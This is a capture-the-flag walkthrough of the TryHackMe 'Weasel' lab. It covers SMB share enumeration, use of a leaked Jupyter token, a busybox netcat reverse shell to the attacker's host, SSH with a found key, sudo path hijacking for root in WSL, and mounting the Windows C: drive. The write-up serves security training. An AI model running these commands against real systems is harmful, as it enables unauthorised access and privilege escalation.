<h3> Weasel TryHackMe </h3>

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d75505c1-e2ce-4fb1-b86f-fe0818711009)

Nmap Scan:
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8e462a6e-01d5-48fc-bc64-c5fe47d96a15)

From the scan we can tell that this is a windows box 

Let's enumerate smb first

Checking the shares available shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/26c7facd-82f4-4d00-8311-461dfd8143db)

Now we can mount the *datasci-team* share
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/444afca1-a3cb-4896-a042-04ad8d917a25)

```
Command: sudo mount -t cifs -o username=guest,password= //10.10.195.131/datasci-team mount
```

After i looked through the smb folders in that share i didn't see anything interesting except this jupyter token
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5ba4420f-bd7d-455d-b7ee-95cb4e73fdc8)

We can now unmount it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5d1dd99e-5400-4c0c-82a5-a108061808f0)

```
Command: sudo umount mount
```

Back to the port 8888 shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e4664709-f541-4726-897e-fe03b3c6abcd)

This is an instance of jupyter and it's running on port 8888

It requies a token to get logged in

Remember we got a token from the smb so using it here works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/62df165e-d12d-4d19-9ede-7314f75b361a)

```
Token: 067470c5ddsadc54153ghfjd817d15b5d5f5341e56b0dsad78a
```

To get shell on jupyter is very easy since it usually have a python interactive instance and also a terminal 

But let's go with the terminal option

Click on the *new button* then click the *terminal button*
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7fc0bd07-3196-4a6d-9bd6-6695bc41e21f)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4958278f-f2f6-458a-b39c-f48fed665167)

I just got a reverse shell using *busybox* binary
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/43e343d2-1f66-49b3-9fb4-0199593dc0f8)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/64553ac3-75c2-4d97-8338-41d227cb7b19)

```
Command: busybox nc 10.2.42.156 1337 -e /bin/bash
```

From here we see that this is a linux host

But our nmap scan showed that this is a windows box 

So the only thing we can think of is that this is a host running [wsl](https://learn.microsoft.com/en-us/windows/wsl/install)

Looking at the current working directory we can see a ssh key for user *dev-datasci-lowpriv*
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f8c7c1ed-34b8-4272-86bb-c2aa9a8d287b)

We can try login to ssh cause it works 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3eb644cd-c349-4dac-be61-9fe268d47bf5)

```
Command:-
chmod 600 id_rsa
ssh -i id_rsa dev-datasci-lowpriv@10.10.195.131
```

Let's see if we can root the wsl host because if that works we can just mount the windows host and access the administrator directory 

Also i'm taking this path cause i suck at privesc in windows 😄

Checking *sudo* permission on the wsl shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/843301ef-3f6b-44ac-afb8-2dbe2cb16308)

Interesting we can run */home/dev-datasci/.local/bin/jupyter* as root that looks too easy already 🙂

But trying it doesn't work
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e06c24fe-f20f-4532-99bf-4c1f25d3d0c8)

We get *command not found* and that is because the binary isn't in that specific path smh

I used *find* command then got the binary
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0f7909af-3e5e-4cac-b62f-5b56d05be07b)

```
Command: find / -type f -name jupyter 2>/dev/null
```

Now we can just copy the binary to that path since we have write access *cause /home/dev-datasci/.local* is owned by us
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/761d9d35-f591-4dac-8aed-f3cca7cfc6db)

```
Command: cp /home/dev-datasci/anaconda3/bin/jupyter /home/dev-datasci/.local/bin/jupyter
```

Running sudo on it now works cool
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5dd59267-e719-4140-b8f2-aa27e5ea2d23)

```
Command: sudo /home/dev-datasci/.local/bin/jupyter --help
```

From here we can start a new lab jupyter instance and access it to get a new terminal running as root

Here's the [docs](https://jupyterlab.readthedocs.io/en/latest/) that helped me out 

But i got this error
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/64fcd6c3-a3d2-4a29-be1e-34c49f88d511)

We can add the *--allow-root* to bypass that message 

Doing that now works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/47e0d398-5eb8-4f0e-afb7-8159b7f400ad)

```
Command:sudo /home/dev-datasci/.local/bin/jupyter notebook --ip 10.10.195.131 --port 8089 --allow-root
```

It created this new link with the token as it's GET parameter *http://10.10.195.131:8089/?token=20c98ba247520987b457638652bc252a9f55c74fe42375ba*

I logged out of that jupyter instance and logged in with the new token
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/691750ea-4141-4958-b24e-cd90724ebd3a)

Following the previous way we used to get shell works also
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/25230ead-be03-46df-9929-fe880a5dbfb9)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/cc39d06f-4885-481f-9fa2-e77b396426e2)

But remember we are just root on this wsl but this gives us the permission to access the *C:\* drive on the windows thos

We can now just mount it

Here's the [resource](https://www.public-health.uiowa.edu/it/support/kb48568/) that helped me out

Mounting it works and we can grab the root flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fe087f4c-d35c-4f51-8482-1d2146ffd037)

```
Command:-
mkdir /mnt/windows
mount -t drvfs C: /mnt/windows
```

The flag is saying something about elevated privesc *THM{evelated_w3as3l_l0ngest_boi}* maybe intended was by getting root from the main host via elevated privilege escalation idk 🤔

And we're done 👻
